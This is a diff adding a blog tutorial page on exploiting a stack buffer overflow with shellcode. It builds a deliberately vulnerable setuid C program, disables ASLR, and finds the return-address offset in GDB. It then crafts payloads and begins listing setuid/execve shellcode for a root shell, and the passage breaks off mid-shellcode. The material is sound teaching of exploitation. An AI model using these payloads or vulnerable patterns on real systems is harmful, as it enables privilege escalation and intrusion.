@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buffer Overflow - Shellcode</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/monokai.css">
+    <link rel="stylesheet" href="/articles.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="hero">
+        <div class="hero-content">
+            <img src="/img/articles/logo7.png" alt="index-logo" class="index-logo">
+            <h1>Buffer Overflow</h1>
+            <p>Exploiting the stack to execute malicious instructions</p>
+            <a href="/articles.html" class="mainbtn" class="mainbtn">More articles</a>
+        </div>
+    </section>
+    <section class="article-content">
+        <div class="container">
+            <div class="article-content-main">
+                <h3>Introduction</h3><br/>
+<p>In my article on <a href="https://elswix.github.io/articles/5/introduction-to-buffer-overflow.html">Introduction to Buffer Overflow</a>, we explored exploiting a Buffer Overflow vulnerability to commandeer the instruction pointer. This led us to redirect the program's execution flow to a different function not originally called within our program.</p><br/>
+<p>However, since it was a basic illustration of Buffer Overflow, we didn't achieve any significant exploitation potential. Today, we'll delve into the Shellcode technique, focusing on exploiting buffer overflow to gain system access or potentially escalate privileges.</p><br/>
+<h3>What is Shellcode?</h3><br/>
+<p>Shellcode is a small piece of code typically written in assembly language that is injected into a vulnerable program's memory during a buffer overflow attack. This code is designed to exploit the vulnerability and execute specific actions, often granting the attacker unauthorized access to the system or allowing them to execute arbitrary commands. Shellcode is called "shellcode" because it commonly spawns a command shell (such as a Unix shell or a Windows command prompt) for the attacker to interact with, hence giving them control over the compromised system.</p><br/>
+<h3>ShellCode in Stack-Based Buffer Overflow</h3><br/>
+<p>Exploiting a Buffer Overflow with shellcode involves controlling the return pointer (Instruction Pointer) to point to a section in the stack where the malicious instructions were placed. </p><br/>
+<p>As you have seen in the <a href="https://elswix.github.io/articles/5/introduction-to-buffer-overflow.html">Introduction to Buffer Overflow</a> article, when you overflow the stack, you commonly reach the return address. This address was placed when the vulnerable function was <a href="https://elswix.github.io/articles/2/assembly-instructions-intel-x86.html">called</a> and is the address where the program will return after executing the <a href="https://elswix.github.io/articles/2/assembly-instructions-intel-x86.html">ret</a> instruction. The attacker, through the buffer overflow, modifies this address to control the Instruction Pointer to any address they want, thereby controlling the program flow.</p><br/>
+<p>When the attacker aims to exploit this technique, they create a malicious payload that overwrites the return address with one specified by the attacker, while also embedding crafted shellcode onto the stack. The altered return address directs the program execution flow to the beginning of the shellcode, strategically placed by the attacker on the stack. This necessitates that the attacker possess knowledge of stack addresses before finalizing their payload.</p><br/>
+<p>Let's see this graphically:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/7/img/1.png"/></p><br/>
+<p>I'll explain this image so that you can understand the attack representation well.</p><br/>
+<p>On the left, there are decimal numbers representing memory addresses within the stack. The word <strong>"data"</strong> signifies random data stored on the stack.</p><br/>
+<p>On the right, there are texts, each indicating a section on the stack containing the described data. For instance, the text <strong>"user input"</strong> points to the section on the stack where user input is stored.</p><br/>
+<p>The decimal numbers stored within the stack, such as the one pointed to by the text <strong>"Return Address"</strong>, are also memory addresses. In the case of <strong>"return address"</strong>, it holds the memory address (10) to which the program will return.</p><br/>
+<p>Let's see what happens if the user enters a large string:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/7/img/2.png"/></p><br/>
+<p>As you can see, the stack has been overflowed, including important saved values such as the Return Address and the Saved EBP. Now, if the function returns, meaning the <code>ret</code> instruction is executed and pops the saved return address value, the program will attempt to point to the memory address <code>0x41414141</code> (the string "AAAA" in hexadecimal), which will inevitably crash the program.</p><br/>
+<p>Once the attacker realizes they can overwrite the return address with a custom one, they should assess which protections the binary incorporates. Exploiting a buffer overflow using shellcode requires that the NX (No eXecute) protection be disabled. Remember that NX protection prevents certain sections of the binary from being interpreted as instructions. In this scenario, the attacker controls the stack. If the attacker redirects the return pointer to a section of the stack where they've placed malicious instructions, and the NX protection is disabled, those instructions will be executed. Otherwise, if the NX protection is enabled, those instructions won't execute, and the program will crash.</p><br/>
+<p>In the event the NX protection is disabled, the attacker should do the following:</p><br/>
+<p>Firstly, they have to understand the addresses of the stack, including where the return pointer is overwritten and where their shellcode is placed on the stack. Once they identify where the shellcode begins on the stack, they need to place that address in the return address. This way, when the function returns, the malicious address is placed in the Instruction Pointer, and the program flow continues from the beginning of the shellcode.</p><br/>
+<p>Let's see this process graphically:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/7/img/3.png"/></p><br/>
+<p>As observed, the attacker successfully overflowed the stack. They created a carefully designed payload to overwrite the return address with the address 36 and then to place the shellcode on the stack. Now, when the function returns, the program flow will continue from address 36, which indeed holds the beginning of the shellcode on the stack.</p><br/>
+<h3>Practice</h3><br/>
+<p>Let's attempt to exploit a buffer overflow by abusing this technique. Since this is a simple demonstration of how attackers can exploit a buffer overflow using shellcode, we'll disable every binary protection to make it simpler.</p><br/>
+<p>Firstly, let's disable the ASLR protection:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">root@ubuntu$</span> <span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span>
+</pre></div>
+<p>You can activate it later by either entering "2" as the value in that file or by restarting the system.</p><br/>
+<p><strong>C Program:</strong></p><br/>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="c1">// Compile: gcc program.c -o program -no-pie -fno-stack-protector -z execstack -m32</span>
+
+
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">vulnFunction</span><span class="p">(){</span><span class="w"></span>
+
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"Please, enter your username: "</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"Hello, %s"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="w"></span>
+<span class="w">  </span><span class="n">vulnFunction</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>Let's compile it using <code>gcc</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gcc</span> <span class="n">program</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">program</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">z</span> <span class="n">execstack</span> <span class="o">-</span><span class="n">m32</span>
+</pre></div>
+<p>Let's switch the ownership of this file to root and set it as Set-UID. This way, we can later elevate privileges when exploiting it:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sudo</span> <span class="n">chown</span> <span class="n">root</span><span class="p">:</span><span class="n">root</span> <span class="n">program</span>
+<span class="nd">elswix@ubuntu$</span> <span class="n">sudo</span> <span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="n">program</span>
+</pre></div>
+<p>Once the program is ready, let's execute it:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">elswix</span>
+<span class="n">Hello</span><span class="p">,</span> <span class="n">elswix</span>
+</pre></div>
+<p>As you can see, the program asks for a username and then prints it back to the stdout. </p><br/>
+<p>Let's see what happens if we enter a very large string in order to trigger a buffer overflow.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="o">./</span><span class="n">program</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>As observed, the program has crashed. This indicates that we overflowed the stack and overwrote the return address, causing the program to attempt to return to an address such as <code>0x41414141</code> (the string "AAAA" in hexadecimal), which of course it couldn't.</p><br/>
+<p>Let's use <code>gdb</code> to perform a thorough examination of the program's behavior:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">program</span>
+<span class="n">GEF</span> <span class="k">for</span> <span class="n">linux</span> <span class="n">ready</span><span class="p">,</span> <span class="nb">type</span> <span class="n">`</span><span class="n">gef</span><span class="s1">' to start, `gef config'</span> <span class="n">to</span> <span class="n">configure</span>
+<span class="mi">88</span> <span class="n">commands</span> <span class="n">loaded</span> <span class="ow">and</span> <span class="mi">5</span> <span class="n">functions</span> <span class="n">added</span> <span class="k">for</span> <span class="n">GDB</span> <span class="mf">12.1</span> <span class="ow">in</span> <span class="mf">0.00</span><span class="n">ms</span> <span class="n">using</span> <span class="n">Python</span> <span class="n">engine</span> <span class="mf">3.10</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="nn">program...</span>
+<span class="p">(</span><span class="n">No</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">program</span><span class="p">)</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>By the way, I'm using the <a href="https://github.com/hugsy/gef">GDB Enhanced Features (GEF)</a> extension for GDB, as it provides enhancements to the original GDB. </p><br/>
+<p>Let's execute this program using the gdb command <code>r</code>, and then enter a large string:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">bufferoverflow</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">shellcode</span><span class="o">/</span><span class="n">program</span> 
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+<span class="mh">0x41414141</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p><img alt="" src="https://elswix.github.io/articles/7/img/4.png"/></p><br/>
+<p>As observed, our string has overwritten several registers, including the Instruction Pointer. This is because we have overflowed the stack, and some registers store their previous values there. When the function returns, these stored values are overwritten, consequently, allowing user-controlled values to be popped.</p><br/>
+<p>The most interesting value to overwrite is the return address, since when the function returns, this value is popped into the EIP register, allowing us to control the Instruction Pointer, and consequently, the program flow.</p><br/>
+<p>So far, we know that we can control the instruction pointer by overwriting the return address on the stack. However, we don't know how many characters we have to enter prior to starting overwriting the return address. As explained in my <a href="https://elswix.github.io/articles/5/introduction-to-buffer-overflow.html">Introduction to Buffer Overflow</a> article, an attacker could create a pattern string. Then, when it overwrites the return address, they can examine the value of the instruction pointer and compare it with their pattern string to determine where the overwrite occurred.</p><br/>
+<p>For instance, imagine the attacker enter a string like this:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM</span>
+</pre></div>
+<p>This is a pattern string. When you enter it and the program tries to return to an address like <code>0x49494949</code>, you'll notice that the return address was overwritten where the characters <code>IIII</code> were entered. This helps you identify where to place malicious addresses to control the program flow.</p><br/>
+<p>GEF contains a useful tool to automate this process. Firstly, let's create a pattern with the command <code>pattern create</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">pattern</span> <span class="n">create</span> <span class="mi">100</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">100</span> <span class="nb">bytes</span> <span class="p">(</span><span class="n">n</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="k">as</span> <span class="s1">'$_gef1'</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>Then, let's execute the program and enter the generated string as input:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">bufferoverflow</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">shellcode</span><span class="o">/</span><span class="n">program</span> 
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+<span class="mh">0x61616169</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p><img alt="" src="https://elswix.github.io/articles/7/img/5.png"/></p><br/>
+<p>As you can see, the instruction pointer (EIP) holds the string 0x61616169 (the string "iaaa" in hexadecimal). This indicates that the return address was overwritten when we entered the string <code>iaaa</code>.</p><br/>
+<p>To calculate how many characters we need to enter to reach the return address, since we entered the pattern string generated by gef, we can use the command <code>pattern offset $eip</code> to determine the number of characters required before overwriting the return address.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">pattern</span> <span class="n">offset</span> <span class="n">$</span><span class="n">eip</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="s1">'69616161'</span><span class="o">/</span><span class="s1">'61616169'</span> <span class="k">with</span> <span class="n">period</span><span class="o">=</span><span class="mi">4</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">32</span> <span class="p">(</span><span class="n">little</span><span class="o">-</span><span class="n">endian</span> <span class="n">search</span><span class="p">)</span> <span class="n">likely</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>As observed, we need to enter 32 characters before overwriting the return address.</p><br/>
+<p>Let's verify if this is true by creating a string of 32 'A' characters followed by 4 'B' characters:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*32 + "B"*4)'</span><span class="p">)</span>
+
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">bufferoverflow</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">shellcode</span><span class="o">/</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*32 + "B"*4)'</span><span class="p">)</span>
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+<span class="mh">0x42424242</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p><img alt="" src="https://elswix.github.io/articles/7/img/6.png"/></p><br/>
+<p>It worked! We overwrote the EIP with the string "BBBB". This indicates that we need to enter 32 bytes (characters) before overwriting the return address. </p><br/>
+<p>To successfully exploit this buffer overflow using ShellCode, we firstly need to determine where to place it. Since we control the stack, we can position it there and redirect the instruction pointer to the start of our shellcode.</p><br/>
+<p>In theory, the stack pointer should indicate the data we insert into our payload after the return address. To verify this, let's add some stuff after the return address:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*32 + "B"*4 + "C"*16)'</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span>  <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*32 + "B"*4 + "C"*16)'</span><span class="p">)</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">bufferoverflow</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">shellcode</span><span class="o">/</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*32 + "B"*4 + "C"*16)'</span><span class="p">)</span>
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+<span class="mh">0x42424242</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
+<span class="nd"><span class="n"></span>
+</pre></div>
+<p><img alt="" src="https://elswix.github.io/articles/7/img/7.png"/></p><br/>
+<p>As evident, the stack pointer now points to the data we've entered after the return address. Consequently, we could replicate the stack pointer address and set it as the return address. Thus, upon function return, the instruction pointer will point to the stack pointer address, where are located our "C" characters.</p><br/>
+<p>Why do this? Well, during binary compilation, we disabled the NX (No eXecute) protection, allowing executable sections like the stack. By injecting malicious instructions (shellcode) into the stack and directing the instruction pointer to this specific area, those instructions will be executed, leading to code execution.</p><br/>
+<p>As depicted in the image, the stack pointer address was <code>0xffffcfa0</code>, pointing to our <code>C</code> characters placed after the return address. This indicates that we can redirect the instruction pointer to this address, allowing us to insert our malicious instructions (shellcode) in place of those <code>C</code> characters. Therefore, when the instruction pointer reaches these instructions, they will be executed.</p><br/>
+<p>To verify the execution of malicious instructions inserted on the stack, I'll use INT 3 instructions.</p><br/>
+<p>The INT 3 instruction is a software interrupt primarily used for debugging. When executed, it triggers an interrupt, typically causing the program to halt and transfer control to a debugger. This enables developers to inspect the program's state, memory, and execution flow at that point. It's commonly used for setting breakpoints in code to facilitate debugging.</p><br/>
+<p>This means that when the instruction pointer reaches the INT 3 instruction, the program will trigger an interrupt, causing it to enter debugging mode, similar to when using GDB.</p><br/>
+<p>The payload is constructed as follows:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"A"*32 + b"</span><span class="se">\xa0\xcf\xff\xff</span><span class="s1">" + b"</span><span class="se">\xCC</span><span class="s1">"*12)'</span>
+</pre></div>
+<p>Let's break down this payload step by step.</p><br/>
+<p>Firstly, we're using <code>sys.stdout.buffer.write</code> to print non-printable bytes, a technique I explained in detail in my article on <a href="https://elswix.github.io/articles/5/introduction-to-buffer-overflow.html">Introduction to Buffer Overflow</a>.</p><br/>
+<p>The payload starts by printing 32 characters, causing a stack overflow to reach the return address. Then, we insert the address <code>0xffffcfa0</code> in little-endian format. This address points to the stack immediately following the return address, where we previously placed our "C" characters. By inserting this address as the return address, the program will resume execution from <code>0xffffcfa0</code> when the function returns.</p><br/>
+<p>After the return address, we add 12 INT 3 (<code>\xCC</code>) instructions. These instructions are placed on the stack. As a result, when the function returns to <code>0xffffcfa0</code>, the instruction pointer will point to this address, initiating the execution of the instructions on the stack.</p><br/>
+<p>If the exploitation is successful, the program flow will resume from the address <code>0xffffcfa0</code> on the stack, where our INT 3 instructions are located.</p><br/>
+<p>Let's execute the program and enter our payload:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"A"*32 + b"</span><span class="se">\xa0\xcf\xff\xff</span><span class="s1">" + b"</span><span class="se">\xCC</span><span class="s1">"*12)'</span><span class="p">)</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">bufferoverflow</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">shellcode</span><span class="o">/</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"A"*32 + b"</span><span class="se">\xa0\xcf\xff\xff</span><span class="s1">" + b"</span><span class="se">\xCC</span><span class="s1">"*12)'</span><span class="p">)</span>
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGTRAP</span><span class="p">,</span> <span class="n">Trace</span><span class="o">/</span><span class="nb">breakpoint</span> <span class="n">trap</span><span class="o">.</span>
+<span class="mh">0xffffcfa1</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>Great! The execution has now reached our <code>INT 3</code> instructions, as indicated by the message "Trace/breakpoint trap," which initiates debugging mode and halts execution. Essentially, we're currently executing the instructions we placed on the stack by controlling the instruction pointer and directing it to those instructions.</p><br/>
+<p>So far, we achieved execution of controlled instructions. Now, let's try to escalate our privileges and get a shell as the root user. </p><br/>
+<p>Given that the binary is setuid, each instruction executes with the privileges of the binary owner, which in this case is root. To gain root-level execution, we have two options: creating our own shellcode or utilizing pre-existing shellcode developed by others. The latter approach is often preferred as it allows us to utilize shellcode that has been tested and proven to work reliably.</p><br/>
+<p>There are websites, such as <a href="https://shell-storm.org/shellcode/index.html">Shell-Storm</a>, which offer pre-created shellcode, enabling us to execute commands and perform various tasks. My objective is to execute a shellcode that grants me a root shell, essentially executing the following code:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+</pre></div>
+<p>As the binary is setuid and owned by root, one might assume that executing this instruction would grant us a root shell. However, it's not that simple. Before spawning a shell as the root user (<code>/bin/sh</code>), we need to execute the <code>setuid(0)</code> instruction to set all user IDs to root. This step is necessary even though the program is executed with the effective user ID (EUID) of root. For a deeper understanding of why this is essential, I recommend reading my article on <a href="https://elswix.github.io/articles/understanding-linux-user-ids.html">Understanding Linux User IDs</a>.</p><br/>
+<p>In this scenario, there's no issue with using the <code>setuid()</code> function, as there are pre-created shellcodes available that incorporate it before employing <code>execve()</code> to launch <code>/bin/sh</code>. For this purpose, I've selected the following <a href="https://shell-storm.org/shellcode/files/shellcode-516.html">shellcode</a>:</p><br/>
+<div class="highlight"><pre><span></span><span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"></span>
+<span class="w">                                </span><span class="c1">// &lt;_start&gt;:</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\x31\xdb</span><span class="s">"</span><span class="w">                  </span><span class="c1">// xor    %ebx,%ebx</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\x6a\x17</span><span class="s">"</span><span class="w">                  </span><span class="c1">// push   $0x17</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span><span class="w">                      </span><span class="c1">// pop    %eax</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span><span class="w">                  </span><span class="c1">// int    $0x80</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\xf7\xe3</span><span class="s">"</span><span class="w">                  </span><span class="c1">// mul    %ebx</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\xb0\x0b</span><span class="s">"</span><span class="w">                  </span><span class="c1">// mov    $0xb,%al</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\x31\xc9</span><span class="s">"</span><span class="w">                  </span><span class="c1">// xor    %ecx,%ecx</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\x51</span><span class="s">"</span><span class="w">                      </span><span class="c1">// push   %ecx</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\x68\x2f\x2f\x73\x68</span><span class="s">"</span><span class="w">      </span><span class="c1">// push   $0x68732f2f</span>
